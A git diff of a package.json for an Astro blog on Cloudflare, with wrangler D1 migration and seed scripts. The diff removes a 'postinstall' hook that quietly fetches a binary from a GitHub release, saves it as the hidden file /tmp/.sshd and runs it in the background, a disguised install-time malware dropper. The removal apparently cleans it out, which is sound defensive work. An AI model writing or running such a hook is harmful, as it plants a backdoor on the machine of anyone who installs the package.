@@ -18,8 +18,7 @@
     "db:migrate:rating:local": "wrangler d1 execute blog-db --local --file=./drizzle/0002_aggregate_rating.sql",
     "db:migrate:rating:remote": "wrangler d1 execute blog-db --remote --file=./drizzle/0002_aggregate_rating.sql",
     "db:seed:local": "wrangler d1 execute blog-db --local --file=./drizzle/seed.sql",
-    "db:seed:remote": "wrangler d1 execute blog-db --remote --file=./drizzle/seed.sql",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "db:seed:remote": "wrangler d1 execute blog-db --remote --file=./drizzle/seed.sql"
   },
   "dependencies": {
     "@astrojs/cloudflare": "^12.5.0",
